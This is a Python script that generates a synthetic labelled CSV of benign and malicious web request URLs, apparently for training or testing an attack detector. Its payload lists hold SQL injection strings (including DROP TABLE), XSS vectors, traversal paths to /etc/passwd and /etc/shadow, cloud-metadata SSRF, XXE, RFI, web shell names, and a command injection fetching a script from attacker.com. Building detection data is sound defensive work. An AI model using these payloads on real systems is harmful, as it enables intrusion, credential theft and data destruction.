import random
import string
import csv
from datetime import datetime, timedelta


class AttackDatasetGenerator:
    def __init__(self):
        self.attack_types = [
            'sql_injection',
            'xss',
            'directory_traversal',
            'command_injection',
            'ssrf',
            'lfi',
            'rfi',
            'credential_stuffing',
            'typosquatting',
            'http_parameter_pollution',
            'xxe',
            'web_shell',
            'brute_force'
        ]

        self.sql_payloads = [
            "' OR 1=1 --",
            "' UNION SELECT username,password FROM users --",
            "'; DROP TABLE users --",
            "' OR 'a'='a",
            "' AND SLEEP(5) --"
        ]

        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]

        self.traversal_payloads = [
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd"
        ]

        self.command_payloads = [
            "; cat /etc/passwd",
            "&& whoami",
            "| ls -la",
            "`ping 127.0.0.1`",
            "$(curl attacker.com/shell.sh)"
        ]

        self.ssrf_payloads = [
            "http://localhost:8080",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]

        self.hpp_payloads = [
            "id=1&id=2",
            "user=admin&user=hacker",
            "q=phone&q=laptop"
        ]

        self.xxe_payloads = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
        ]

        self.web_shell_names = [
            "cmd.jsp",
            "shell.php",
            "backdoor.asp",
            "c99.php",
            "r57.php"
        ]

        self.benign_urls = [
            "https://example.com/home",
            "https://google.com/search?q=python",
            "https://github.com/user/repo",
            "https://stackoverflow.com/questions/123",
            "https://docs.python.org/3/"
        ]

    def generate_attack_url(self, attack_type):

        base = "http://vulnerable.app/"

        if attack_type == 'sql_injection':
            return base + "login.php?user=" + random.choice(self.sql_payloads)

        elif attack_type == 'xss':
            return base + "search.php?q=" + random.choice(self.xss_payloads)

        elif attack_type == 'directory_traversal':
            return base + "file.php?path=" + random.choice(self.traversal_payloads)

        elif attack_type == 'command_injection':
            return base + "cmd.php?input=" + random.choice(self.command_payloads)

        elif attack_type == 'ssrf':
            return base + "fetch.php?url=" + random.choice(self.ssrf_payloads)

        elif attack_type == 'lfi':
            return base + "include.php?page=" + random.choice(self.traversal_payloads)

        elif attack_type == 'rfi':
            return base + "include.php?page=http://attacker.com/" + ''.join(random.choices(string.ascii_lowercase, k=8)) + ".php"

        elif attack_type == 'credential_stuffing':
            return base + f"login?user=admin&pass={''.join(random.choices(string.ascii_letters + string.digits, k=10))}"

        elif attack_type == 'brute_force':
            return base + f"login?username=admin&password={random.randint(1000,9999)}"

        elif attack_type == 'typosquatting':
            domains = ['gooogle.com', 'facbook.com', 'youtbe.com', 'githob.com']
            return f"http://{random.choice(domains)}/secure"

        elif attack_type == 'http_parameter_pollution':
            return base + "product?" + random.choice(self.hpp_payloads)

        elif attack_type == 'xxe':
            return random.choice(self.xxe_payloads)

        elif attack_type == 'web_shell':
            return base + "upload/" + random.choice(self.web_shell_names)

        else:
            return base + "home"

    def generate_record(self, is_malicious=True):

        if is_malicious:
            attack_type = random.choice(self.attack_types)
            url = self.generate_attack_url(attack_type)
            severity = random.choice(['low', 'medium', 'high', 'critical'])
        else:
            attack_type = 'none'
            url = random.choice(self.benign_urls)
            severity = 'none'

        timestamp = datetime.now() - timedelta(days=random.randint(0, 30))

        return {
            'timestamp': timestamp.isoformat(),
            'source_ip': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
            'url': url,
            'method': random.choice(['GET', 'POST']),
            'attack_type': attack_type,
            'is_malicious': is_malicious,
            'severity': severity
        }

    def generate_dataset(self, num_records=1500, malicious_ratio=0.5):

        dataset = []
        num_malicious = int(num_records * malicious_ratio)
        num_benign = num_records - num_malicious

        for _ in range(num_malicious):
            dataset.append(self.generate_record(True))

        for _ in range(num_benign):
            dataset.append(self.generate_record(False))

        random.shuffle(dataset)
        return dataset

    def export_to_csv(self, dataset, filename="web_attack_dataset.csv"):

        keys = dataset[0].keys()
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            writer.writerows(dataset)

        print(f"\nDataset saved as {filename}")
        print(f"Total records: {len(dataset)}")


if __name__ == "__main__":
    generator = AttackDatasetGenerator()
    dataset = generator.generate_dataset(num_records=1500, malicious_ratio=0.5)
    generator.export_to_csv(dataset)